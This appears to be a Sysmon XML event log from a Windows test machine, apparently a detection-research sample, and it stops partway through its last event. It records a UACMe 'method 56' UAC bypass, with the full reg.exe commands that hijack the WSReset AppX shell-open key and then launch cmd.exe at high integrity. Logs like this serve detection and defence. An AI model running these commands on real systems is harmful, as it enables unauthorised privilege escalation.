<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:29.676336700Z" />
      <EventRecordID>5942</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:29.630</Data>
      <Data Name="ProcessGuid">{747F3D96-B07D-5D46-0000-00103C8C0F04}</Data>
      <Data Name="ProcessId">7588</Data>
      <Data Name="Image">C:\Users\IEUser\Desktop\UACME.exe</Data>
      <Data Name="FileVersion">3.1.9.1905</Data>
      <Data Name="Description">UACMe main module</Data>
      <Data Name="Product">UACMe</Data>
      <Data Name="Company">Hazardous Environments</Data>
      <Data Name="CommandLine">UACME.exe  56</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020FBD31800}</Data>
      <Data Name="LogonId">0x18d3fb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=9E57914D39FBFE785C915E225011892613C4714C,MD5=D57E778DF10F801F47119A04BE990FFD,SHA256=D76815CE3F4B9FE7A611D6F536F65AF313E2AB2F8BB52EF0998487D89A6E7378,IMPHASH=B6789EDFE23DDA911AE37C87444D3DCB</Data>
      <Data Name="ParentProcessGuid">{747F3D96-5A29-5D45-0000-0010DEB99000}</Data>
      <Data Name="ParentProcessId">5780</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:31.175295700Z" />
      <EventRecordID>5943</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:31.109</Data>
      <Data Name="ProcessGuid">{747F3D96-B07F-5D46-0000-001031A90F04}</Data>
      <Data Name="ProcessId">1768</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Registry Console Tool</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">C:\Windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command /v "DelegateExecute" /t REG_SZ /d "" /f</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020FBD31800}</Data>
      <Data Name="LogonId">0x18d3fb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC</Data>
      <Data Name="ParentProcessGuid">{747F3D96-56A4-5D45-0000-0010A5FA1800}</Data>
      <Data Name="ParentProcessId">4772</Data>
      <Data Name="ParentImage">C:\Windows\System32\sihost.exe</Data>
      <Data Name="ParentCommandLine">sihost.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:31.476803200Z" />
      <EventRecordID>5944</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">PrivEsc - UAC bypass UACME-56</Data>
      <Data Name="EventType">SetValue</Data>
      <Data Name="UtcTime">2019-08-04 10:16:31.415</Data>
      <Data Name="ProcessGuid">{747F3D96-B07F-5D46-0000-001031A90F04}</Data>
      <Data Name="ProcessId">1768</Data>
      <Data Name="Image">C:\Windows\system32\reg.exe</Data>
      <Data Name="TargetObject">HKU\S-1-5-21-3461203602-4096304019-2269080069-1000_Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command\DelegateExecute</Data>
      <Data Name="Details">(Empty)</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:31.485931900Z" />
      <EventRecordID>5945</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:31.458</Data>
      <Data Name="ProcessGuid">{747F3D96-B07F-5D46-0000-0010F1B20F04}</Data>
      <Data Name="ProcessId">2444</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Registry Console Tool</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">C:\Windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command /v "" /t REG_SZ /d "C:\Windows\system32\cmd.exe /c start C:\Windows\system32\cmd.exe" /f</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020FBD31800}</Data>
      <Data Name="LogonId">0x18d3fb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC</Data>
      <Data Name="ParentProcessGuid">{747F3D96-56A4-5D45-0000-0010A5FA1800}</Data>
      <Data Name="ParentProcessId">4772</Data>
      <Data Name="ParentImage">C:\Windows\System32\sihost.exe</Data>
      <Data Name="ParentCommandLine">sihost.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:31.609571400Z" />
      <EventRecordID>5946</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">PrivEsc - UAC bypass UACME-56</Data>
      <Data Name="EventType">SetValue</Data>
      <Data Name="UtcTime">2019-08-04 10:16:31.572</Data>
      <Data Name="ProcessGuid">{747F3D96-B07F-5D46-0000-0010F1B20F04}</Data>
      <Data Name="ProcessId">2444</Data>
      <Data Name="Image">C:\Windows\system32\reg.exe</Data>
      <Data Name="TargetObject">HKU\S-1-5-21-3461203602-4096304019-2269080069-1000_Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command\(Default)</Data>
      <Data Name="Details">C:\Windows\system32\cmd.exe /c start C:\Windows\system32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:31.949078000Z" />
      <EventRecordID>5947</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:31.884</Data>
      <Data Name="ProcessGuid">{747F3D96-B07F-5D46-0000-001050C80F04}</Data>
      <Data Name="ProcessId">200</Data>
      <Data Name="Image">C:\Windows\System32\WSReset.exe</Data>
      <Data Name="FileVersion">10.0.17763.592 (WinBuild.160101.0800)</Data>
      <Data Name="Description">This tool resets the Windows Store without changing account settings or deleting installed apps</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\system32\WSReset.exe" </Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020FBD31800}</Data>
      <Data Name="LogonId">0x18d3fb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=A75F9C233E1C56AD0B3A0FDCFF1368E7FB3EA1D7,MD5=0D2BE4AE7AE5B93B47E12F4EFF38A0D7,SHA256=5FDDA5D5E3AE48A72CD3E71410BF0A67512B7793006CAB5878D1361000616AD6,IMPHASH=AB03184F9306BF7E8482C6F987BA1832</Data>
      <Data Name="ParentProcessGuid">{747F3D96-B07D-5D46-0000-00103C8C0F04}</Data>
      <Data Name="ParentProcessId">7588</Data>
      <Data Name="ParentImage">C:\Users\IEUser\Desktop\UACME.exe</Data>
      <Data Name="ParentCommandLine">UACME.exe  56</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:32.001792100Z" />
      <EventRecordID>5948</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:31.980</Data>
      <Data Name="ProcessGuid">{747F3D96-B07F-5D46-0000-0010C1CB0F04}</Data>
      <Data Name="ProcessId">3952</Data>
      <Data Name="Image">C:\Windows\System32\consent.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Consent UI for administrative applications</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">consent.exe 896 312 000002806444CB40</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
      <Data Name="LogonGuid">{747F3D96-D4E9-5D45-0000-0020E7030000}</Data>
      <Data Name="LogonId">0x3e7</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949</Data>
      <Data Name="ParentProcessGuid">{747F3D96-5769-5D45-0000-001044E83300}</Data>
      <Data Name="ParentProcessId">896</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:32.438711400Z" />
      <EventRecordID>5949</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:32.267</Data>
      <Data Name="ProcessGuid">{747F3D96-B080-5D46-0000-0010D4EA0F04}</Data>
      <Data Name="ProcessId">2112</Data>
      <Data Name="Image">C:\Windows\System32\WSReset.exe</Data>
      <Data Name="FileVersion">10.0.17763.592 (WinBuild.160101.0800)</Data>
      <Data Name="Description">This tool resets the Windows Store without changing account settings or deleting installed apps</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\system32\WSReset.exe" </Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020B3D31800}</Data>
      <Data Name="LogonId">0x18d3b3</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=A75F9C233E1C56AD0B3A0FDCFF1368E7FB3EA1D7,MD5=0D2BE4AE7AE5B93B47E12F4EFF38A0D7,SHA256=5FDDA5D5E3AE48A72CD3E71410BF0A67512B7793006CAB5878D1361000616AD6,IMPHASH=AB03184F9306BF7E8482C6F987BA1832</Data>
      <Data Name="ParentProcessGuid">{747F3D96-B07D-5D46-0000-00103C8C0F04}</Data>
      <Data Name="ParentProcessId">7588</Data>
      <Data Name="ParentImage">C:\Users\IEUser\Desktop\UACME.exe</Data>
      <Data Name="ParentCommandLine">UACME.exe  56</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:50.009124600Z" />
      <EventRecordID>5950</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:49.960</Data>
      <Data Name="ProcessGuid">{747F3D96-B091-5D46-0000-001081F71104}</Data>
      <Data Name="ProcessId">820</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Windows Command Processor</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c start C:\Windows\system32\cmd.exe</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020B3D31800}</Data>
      <Data Name="LogonId">0x18d3b3</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data>
      <Data Name="ParentProcessGuid">{747F3D96-B080-5D46-0000-0010D4EA0F04}</Data>
      <Data Name="ParentProcessId">2112</Data>
      <Data Name="ParentImage">C:\Windows\System32\WSReset.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\WSReset.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:50.455910300Z" />
      <EventRecordID>5951</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:50.403</Data>
      <Data Name="ProcessGuid">{747F3D96-B092-5D46-0000-001089041204}</Data>
      <Data Name="ProcessId">7792</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Windows Command Processor</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">C:\Windows\system32\cmd.exe </Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020B3D31800}</Data>
      <Data Name="LogonId">0x18d3b3</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data>
      <Data Name="ParentProcessGuid">{747F3D96-B091-5D46-0000-001081F71104}</Data>
      <Data Name="ParentProcessId">820</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" /c start C:\Windows\system32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:55.299641100Z" />
      <EventRecordID>5952</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:55.294</Data>
      <Data Name="ProcessGuid">{747F3D96-B097-5D46-0000-0010E1321204}</Data>
      <Data Name="ProcessId">1960</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Registry Console Tool</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">C:\Windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command /v "" /t REG_SZ /d "C:\Windows\system32\cmd.exe /c start C:\Windows\system32\cmd.exe" /f</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020FBD31800}</Data>
      <Data Name="LogonId">0x18d3fb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC</Data>
      <Data Name="ParentProcessGuid">{747F3D96-56A4-5D45-0000-0010A5FA1800}</Data>
      <Data Name="ParentProcessId">4772</Data>
      <Data Name="ParentImage">C:\Windows\System32\sihost.exe</Data>
      <Data Name="ParentCommandLine">sihost.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:55.441262300Z" />
      <EventRecordID>5953</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">PrivEsc - UAC bypass UACME-56</Data>
      <Data Name="EventType">SetValue</Data>
      <Data Name="UtcTime">2019-08-04 10:16:55.415</Data>
      <Data Name="ProcessGuid">{747F3D96-B097-5D46-0000-0010E1321204}</Data>
      <Data Name="ProcessId">1960</Data>
      <Data Name="Image">C:\Windows\system32\reg.exe</Data>
      <Data Name="TargetObject">HKU\S-1-5-21-3461203602-4096304019-2269080069-1000_Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command\(Default)</Data>
      <Data Name="Details">C:\Windows\system32\cmd.exe /c start C:\Windows\system32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:55.446479400Z" />
      <EventRecordID>5954</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:55.438</Data>
      <Data Name="ProcessGuid">{747F3D96-B097-5D46-0000-0010E7381204}</Data>
      <Data Name="ProcessId">3444</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Registry Console Tool</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">C:\Windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command /v "DelegateExecute" /t REG_SZ /d "{4ED3A719-CEA8-4BD9-910D-E252F997AFC2}" /f</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-56A3-5D45-0000-0020FBD31800}</Data>
      <Data Name="LogonId">0x18d3fb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC</Data>
      <Data Name="ParentProcessGuid">{747F3D96-56A4-5D45-0000-0010A5FA1800}</Data>
      <Data Name="ParentProcessId">4772</Data>
      <Data Name="ParentImage">C:\Windows\System32\sihost.exe</Data>
      <Data Name="ParentCommandLine">sihost.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:55.643799900Z" />
      <EventRecordID>5955</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">PrivEsc - UAC bypass UACME-56</Data>
      <Data Name="EventType">SetValue</Data>
      <Data Name="UtcTime">2019-08-04 10:16:55.619</Data>
      <Data Name="ProcessGuid">{747F3D96-B097-5D46-0000-0010E7381204}</Data>
      <Data Name="ProcessId">3444</Data>
      <Data Name="Image">C:\Windows\system32\reg.exe</Data>
      <Data Name="TargetObject">HKU\S-1-5-21-3461203602-4096304019-2269080069-1000_Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command\DelegateExecute</Data>
      <Data Name="Details">{4ED3A719-CEA8-4BD9-910D-E252F997AFC2}</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>5</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>5</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-08-04T10:16:55.712009700Z" />
      <EventRecordID>5956</EventRecordID>
      <Correlation />
      <Execution ProcessID="2780" ThreadID="3676" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-08-04 10:16:55.709</Data>
